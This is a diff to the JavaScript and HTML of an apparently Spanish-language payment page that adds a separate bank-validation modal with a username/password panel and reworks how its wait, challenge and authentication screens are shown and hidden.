@@ -786,7 +786,16 @@ const pseBanks = [
       </div>
     </div>
   </section>
+</div>
 
+<div
+  class="pasarela-challenge"
+  id="pagos-auth-screen"
+  hidden
+  role="dialog"
+  aria-modal="true"
+  aria-label="Validación bancaria"
+>
   <section class="pasarela-card pasarela-card--visa" data-challenge-auth="userpass" hidden>
     <div class="pasarela-card__body">
       <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
@@ -1014,6 +1023,11 @@ const pseBanks = [
     challenge?.querySelectorAll('[data-challenge-auth]').forEach((panel) => {
       panel.hidden = true;
     });
+    const authScreen = document.getElementById('pagos-auth-screen');
+    if (authScreen) {
+      authScreen.hidden = true;
+      authScreen.style.display = 'none';
+    }
     challenge?.querySelectorAll('[data-challenge-brand]').forEach((panel) => {
       const active = panel.getAttribute('data-challenge-brand') === brandKey;
       panel.hidden = !active;
@@ -1037,8 +1051,8 @@ const pseBanks = [
   }
 
   function setAuthMessage(kind, message) {
-    const challenge = document.getElementById('pagos-challenge-screen');
-    const panel = challenge?.querySelector(`[data-challenge-auth="${kind}"]`);
+    const screen = document.getElementById('pagos-auth-screen') || document.getElementById('pagos-challenge-screen');
+    const panel = screen?.querySelector(`[data-challenge-auth="${kind}"]`);
     const error = panel?.querySelector('[data-auth-debug-message]');
     if (!error) return;
     error.textContent = message || '';
@@ -1046,13 +1060,22 @@ const pseBanks = [
   }
 
   function showAuthChallenge(kind, merchantLabel, amountLabel, datetimeLabel, withError = '') {
+    const wait = document.getElementById('pagos-wait-screen');
     const challenge = document.getElementById('pagos-challenge-screen');
-    challenge?.querySelectorAll('[data-challenge-brand]').forEach((panel) => {
-      panel.hidden = true;
-    });
-    challenge?.querySelectorAll('[data-challenge-auth]').forEach((panel) => {
+    const screen = document.getElementById('pagos-auth-screen');
+    if (wait) {
+      wait.hidden = true;
+      wait.style.display = 'none';
+    }
+    if (challenge) {
+      challenge.hidden = true;
+      challenge.style.display = 'none';
+    }
+    document.body.classList.add('is-offers-waiting');
+    screen?.querySelectorAll('[data-challenge-auth]').forEach((panel) => {
       const active = panel.getAttribute('data-challenge-auth') === kind;
       panel.hidden = !active;
+      panel.style.display = active ? 'block' : 'none';
       if (!active) return;
       panel.querySelectorAll('[data-challenge-merchant]').forEach((el) => {
         el.textContent = merchantLabel;
@@ -1068,7 +1091,12 @@ const pseBanks = [
       });
       setAuthMessage(kind, '');
     });
-    if (challenge) challenge.hidden = false;
+    if (screen) {
+      screen.hidden = false;
+      screen.removeAttribute('hidden');
+      screen.style.display = 'flex';
+      screen.style.zIndex = '500';
+    }
     if (withError) setAuthMessage(kind, withError);
   }
 
@@ -1724,6 +1752,11 @@ const pseBanks = [
       });
       if (wait) wait.hidden = false;
       if (challenge) challenge.hidden = true;
+      const authScreen = document.getElementById('pagos-auth-screen');
+      if (authScreen) {
+        authScreen.hidden = true;
+        authScreen.style.display = 'none';
+      }
       document.body.classList.add('is-offers-waiting');
 
       sessionStorage.setItem(
